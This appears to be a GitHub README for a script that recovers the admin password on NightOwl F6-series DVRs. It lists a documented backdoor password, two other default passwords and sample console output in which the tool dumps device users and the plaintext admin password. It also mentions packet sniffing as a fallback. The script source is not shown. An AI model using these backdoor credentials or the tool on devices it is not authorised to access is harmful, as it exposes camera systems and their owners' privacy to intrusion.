# Recover NightOwl SVR Password
This script recovers the admin password for the NightOwl F6-series of devices, using the documented backdoor password ```2x8axc```. The backdoor password is useful for regaining read-only access to the device, but in order to reset the actual admin password, or make any system changes, you need a valid admin-level account. This script *should* get that for you, otherwise you can capture network packets while you visit the ```Users``` section to get the password.

<img width="759" alt="nightOwl" src="https://user-images.githubusercontent.com/1743650/198940392-7006054c-d45f-4fd4-a137-f12215b90370.png">

Other possible passwords include:

```
519070
101101
```

For more information, see: https://web.archive.org/web/20200810153724/https://support.nightowlsp.com/hc/en-us/articles/360009216554-Night-Owl-Legacy-Devices

## Good Recovery:
```console
% ./NightOwl_F6-get-admin-password.py -t 10.1.1.5

[INFO] ADMIN USER: admin
[INFO] ADMIN PASS: 4321abcd
```

## Verbose output:
```console
% ./NightOwl_F6-get-admin-password.py -t 10.1.1.5 -v

[VERBOSE] SYSTEM DATA: ['00-23-63-43-BB-98', 'F6-DVR8', 'SRV6.1.0-20150423', 'UPWXLHPP54ZMNBHY111A']
[VERBOSE] USER DATA:   ['4321abcd', 'admin', 'user1', 'user2', 'user3', 'user4', 'user5', '@', 'user6']

[INFO] ADMIN USER: admin
[INFO] ADMIN PASS: 4321abcd
```

## Failed Recovery:
```console
% ./NightOwl_F6-get-admin-password.py -t 10.1.1.10

[ERROR] timed out connecting to 10.1.1.10
Check the IP and try again
```

